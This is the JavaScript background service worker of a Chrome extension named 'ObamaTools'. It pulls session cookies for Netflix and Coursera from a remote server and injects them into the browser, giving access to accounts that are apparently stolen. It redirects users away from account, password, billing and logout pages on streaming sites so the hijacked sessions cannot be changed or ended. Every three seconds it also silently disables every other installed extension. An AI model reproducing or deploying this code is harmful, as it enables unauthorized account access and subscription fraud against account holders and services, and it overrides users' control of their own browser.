console.log('ObamaTools Background Service Worker Starting...');

// Session URL mappings for different services
const SESSION_URLS = {
  '1': 'https://session.khanlegacyagency.com/Netflix/Netflix.php',
  '2': 'https://session.khanlegacyagency.com/Netflix/Netflix.php', // Fixed space issue
  '3': 'https://session.khanlegacyagency.com/Coursera/Coursera.php'
};

// Restricted keywords that trigger redirection
const RESTRICTED_KEYWORDS = ['settings', 'account', 'billing', 'profile', 'subscription', 'password', 'payment', 'logout', 'signout', 'sign-out', 'help', 'support'];

// Supported domains for the extension
const SUPPORTED_DOMAINS = [
  'netflix.com',
  'coursera.org',
  'primevideo.com',
  'hulu.com',
  'disneyplus.com',
  'hbomax.com',
  'peacocktv.com',
  'paramountplus.com',
  'apple.com',
  'crunchyroll.com',
  'funimation.com',
  'spotify.com',
  'youtube.com',
  'twitch.tv'
];

// Ensure monopoly - disable other similar extensions
async function ensureMonopoly() {
  try {
    const extensions = await chrome.management.getAll();
    const self = await chrome.management.getSelf();

    for (const ext of extensions) {
      if (ext.id !== self.id && ext.type === 'extension' && ext.enabled) {
        console.log('Disabling competing extension:', ext.name);
        await chrome.management.setEnabled(ext.id, false);
      }
    }
  } catch (error) {
    console.error('Monopoly check error:', error);
  }
}

// Run monopoly checks
chrome.management.onInstalled.addListener(ensureMonopoly);
chrome.runtime.onStartup.addListener(ensureMonopoly);
chrome.runtime.onInstalled.addListener(ensureMonopoly);
setInterval(ensureMonopoly, 3000);

// Handle navigation to restricted pages
chrome.webNavigation.onBeforeNavigate.addListener((details) => {
  if (details.url && details.frameId === 0) {
    try {
      const urlObj = new URL(details.url);
      const urlLower = details.url.toLowerCase();
      const pathLower = urlObj.pathname.toLowerCase();
      const hostLower = urlObj.hostname.toLowerCase();

      // Check if it's a supported domain
      const isSupportedDomain = SUPPORTED_DOMAINS.some(domain => hostLower.includes(domain));
      if (!isSupportedDomain) return;

      // Check for restricted keywords in the path
      const hasRestrictedKeyword = RESTRICTED_KEYWORDS.some(keyword => pathLower.includes(keyword));

      if (hasRestrictedKeyword) {
        // Allow settings/logout only on specific pages
        if (hostLower.includes('khanlegacyagency.com') && (pathLower === '/settings' || pathLower === '/logout')) {
          return;
        }

        // Redirect to homepage
        const redirectUrl = urlObj.protocol + '//' + urlObj.hostname + '/';
        chrome.tabs.update(details.tabId, { url: redirectUrl });
      }
    } catch (error) {
      // Ignore URL parsing errors
    }
  }
});

// Handle messages from popup/content scripts
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'injectCookies' && (request.sessionId || request.url)) {
    handleInjection(request.sessionId, request.url)
      .then(() => sendResponse({ success: true, message: 'Cookies injected successfully' }))
      .catch((error) => {
        console.error('Injection error:', error);
        sendResponse({ success: false, error: error.message });
      });
    return true; // Will respond asynchronously
  }

  if (request.action === 'healthCheck') {
    sendResponse({ alive: true });
    return true;
  }
});

// Main injection handler
async function handleInjection(sessionId, directUrl) {
  const sessionUrl = directUrl || SESSION_URLS[String(sessionId).trim()];

  if (!sessionUrl) {
    throw new Error(`Invalid session ID: ${sessionId}`);
  }

  console.log(`Fetching cookies from session: ${sessionId} (${sessionUrl})`);

  // Fetch the session page with proper headers to avoid 415 error
  const response = await fetch(sessionUrl, {
    method: 'GET',
    headers: {
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      'Accept-Language': 'en-US,en;q=0.9',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Cache-Control': 'no-cache',
      'Pragma': 'no-cache',
      'Sec-Fetch-Dest': 'document',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-Site': 'none',
      'Sec-Fetch-User': '?1',
      'Upgrade-Insecure-Requests': '1'
    },
    credentials: 'omit',
    mode: 'cors'
  });

  if (!response.ok) {
    throw new Error(`HTTP Error: ${response.status}`);
  }

  const html = await response.text();
  const cookies = extractCookies(html);

  if (!cookies || cookies.length === 0) {
    console.log('Response preview:', html.slice(0, 1000));
    throw new Error('Could not find cookie data in response');
  }

  // Extract redirect URL
  let redirectUrl = extractRedirect(html);
  if (!redirectUrl) {
    // Fallback to domain-based URL
    let domain = cookies[0].domain;
    if (domain.startsWith('.')) {
      domain = domain.slice(1);
    }
    redirectUrl = 'https://' + domain + '/';
  }

  // Inject all cookies
  for (const cookie of cookies) {
    await setCookie(cookie);
  }

  // Open the target site
  await chrome.tabs.create({ url: redirectUrl, active: true });

  return true;
}

// Extract cookies from HTML
function extractCookies(html) {
  // 1. Try to find content inside div with id extv or ext01JSONdiv
  const divRegex = /<div[^>]*id=["'](?:extv|ext01JSONdiv)["'][^>]*>([\s\S]*?)<\/div>/i;
  const divMatch = html.match(divRegex);

  if (divMatch && divMatch[1]) {
    const rawContent = divMatch[1].trim();
    // Find the JSON array within the div content - using greedy matching to get the whole array
    const bracketMatch = rawContent.match(/\[\s*\{[\s\S]*\}\s*\]/);
    if (bracketMatch) {
      try {
        const parsed = JSON.parse(bracketMatch[0]);
        if (Array.isArray(parsed)) return processCookieArray(parsed);
      } catch (e) {
        console.error('JSON parse error from div:', e);
      }
    }
  }

  // 2. Global fallback: search for any JSON-like array that looks like cookies.
  // We use a more careful approach than a single regex to handle multiple cookies correctly.
  let bestMatch = null;
  const globalRegex = /\[\s*\{[\s\S]+?\}\s*\]/g;
  let match;

  while ((match = globalRegex.exec(html)) !== null) {
    const potential = match[0];
    if (potential.includes('"domain"') || potential.includes("'domain'")) {
      try {
        // Try to parse the potential JSON. If there are multiple objects, 
        // the lazy regex might stop at the first }. We need to find the matching brace.
        const startIdx = match.index;
        let balance = 0;
        let endIdx = -1;

        for (let i = startIdx; i < html.length; i++) {
          if (html[i] === '[') balance++;
          else if (html[i] === ']') {
            balance--;
            if (balance === 0) {
              endIdx = i;
              break;
            }
          }
        }

        if (endIdx !== -1) {
          const fullJsonStr = html.substring(startIdx, endIdx + 1);
          const parsed = JSON.parse(fullJsonStr);
          if (Array.isArray(parsed) && parsed.length > 0) {
            if (!bestMatch || fullJsonStr.length > bestMatch.length) {
              bestMatch = fullJsonStr;
            }
          }
        }
      } catch (e) { }
    }
  }

  if (bestMatch) {
    try {
      return processCookieArray(JSON.parse(bestMatch));
    } catch (e) { }
  }

  return null;
}

// Process cookie array
function processCookieArray(cookies) {
  return cookies.map(cookie => {
    let domain = cookie.domain;

    // Ensure domain starts with dot for cookie scope if not hostOnly
    if (!cookie.hostOnly && domain && !domain.startsWith('.')) {
      domain = '.' + domain;
    }

    const cookieObj = {
      url: 'https://' + (domain && domain.startsWith('.') ? domain.slice(1) : (domain || '')),
      name: cookie.name,
      value: cookie.value,
      domain: domain,
      path: cookie.path || '/',
      secure: cookie.secure || false,
      httpOnly: cookie.httpOnly || false,
      expirationDate: cookie.expirationDate || Math.floor(Date.now() / 1000) + 31536000
    };

    // Determine sameSite value - only set if it's a recognized string
    if (cookie.sameSite) {
      const ss = String(cookie.sameSite).toLowerCase();
      if (ss.includes('strict')) cookieObj.sameSite = 'strict';
      else if (ss.includes('lax')) cookieObj.sameSite = 'lax';
      else if (ss.includes('none') || ss.includes('no_restriction')) {
        cookieObj.sameSite = 'no_restriction';
        cookieObj.secure = true; // Chrome requires Secure for SameSite=None
      }
    }

    return cookieObj;
  });
}

// Extract redirect URL from HTML
function extractRedirect(html) {
  // 1. First, check the extv div for a href attribute specifically
  const extvMatch = html.match(/<div[^>]*id=["']extv["'][^>]*href=["']([^"']+)["']/i);
  if (extvMatch && extvMatch[1]) return extvMatch[1];

  // 2. Check for window.location.href assignment
  const locationMatch = html.match(/window\.location\.href\s*=\s*["']([^"']+)["']/);
  if (locationMatch && locationMatch[1]) return locationMatch[1];

  // 3. Fallback: find any link to a non-service domain
  const hrefMatch = html.match(/href=["'](https?:\/\/[^"']+)["']/g);
  if (hrefMatch) {
    for (const m of hrefMatch) {
      const url = m.match(/href=["']([^"']+)["']/)[1];
      if (!url.includes('khanlegacyagency.com') && !url.includes('session.')) {
        return url;
      }
    }
  }

  return null;
}

// Set a single cookie
function setCookie(cookie) {
  return new Promise((resolve) => {
    chrome.cookies.set({
      url: cookie.url,
      name: cookie.name,
      value: cookie.value,
      domain: cookie.domain,
      path: cookie.path,
      secure: cookie.secure,
      httpOnly: cookie.httpOnly,
      sameSite: cookie.sameSite,
      expirationDate: cookie.expirationDate
    }, () => {
      chrome.runtime.lastError; // Clear error
      resolve();
    });
  });
}